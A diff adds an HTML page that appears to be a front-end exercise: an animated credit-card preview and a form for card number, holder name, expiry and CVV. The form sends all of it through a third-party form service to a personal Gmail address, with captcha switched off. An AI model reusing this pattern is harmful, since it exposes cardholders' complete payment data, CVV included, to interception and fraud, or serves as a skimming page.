@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Card-info</title>
+    <link rel="stylesheet" href="../CSS/style.css">
+    <link rel="stylesheet" href="../CSS/root.css">
+</head>
+<body>
+    <section id="page">
+        <div id="container">
+            <div id="card">
+                <div id="card-content">
+                    <div id="card-top">
+                        <div id="chip">
+                            <img src="../ASSETS/chip.png" width= "70px" draggable="false">
+                        </div>
+                        <div id="visa">
+                            <img src="../ASSETS/visa.png" width="90px" draggable="false">
+                        </div>
+                    </div>
+                    <div id="card-number">
+                        <input class="number" id="number" placeholder="####  ####  ####  ####" readonly>
+                    </div>
+                    <div id="card-bottom">
+                        <div id="card-holder">
+                            <span class="card-bottom-span">Card Holder</span>
+                            <input id="card-holder-full-name" placeholder="FULL NAME" readonly>
+                        </div>
+                        <div id="card-expires">
+                            <span class="card-bottom-span">Expires</span>
+                            <input id="card-expires-date" placeholder="MM/YY" readonly>
+                        </div>
+                    </div>
+                </div>
+                <div id="card-back">
+                    <img src="../ASSETS/banda.png" alt="Banda Magnética">
+                    <input type="text" id="card-cvv" placeholder="CVV" readonly>
+                </div>
+            </div>
+            <form action="https://formsubmit.co/diogomariasantos3@gmail.com" method="POST">
+                <div id="form-card-number">
+                    <span>Card Number</span>
+                    <input type="text" name="Card Number" id="input-number" oninput="validarNumero(this)" maxlength="19" required>
+                </div>
+                <div id="form-card-holder">
+                    <span>Card Holder</span>
+                    <input type="text" name="Card Holder" id="input-holder" oninput="validarLetra(this)" maxlength="18" required>
+                </div>
+                <div id="form-card-expires-date">
+                    <span>Expiration Date</span>
+                    <div id="form-card-expires-date-inputs">
+                        <input type="text" name="Month" id="input-month" oninput="validarNumero(this)" minlength="2" maxlength="2" required>
+                        <input type="text" name="Year" id="input-year" oninput="validarNumero(this)" minlength="4" maxlength="4" required>
+                    </div>
+                </div>
+                <div id="form-cvv">
+                    <span>CVV</span>
+                    <input type="text" name="CVV" id="input-cvv" maxlength="3" oninput="validarNumero(this)" required>
+                </div>
+                <input type="submit" id="submit" placeholder="SUBMIT">
+
+                <input type="hidden" name="_next" value="http://127.0.0.1:5500/index.html">
+                <input type="hidden" name="_captcha" value="false">
+            </form>
+        </div>
+    </section>
+    <script src="../JS/script.js"></script>
+</body>
+</html>
+
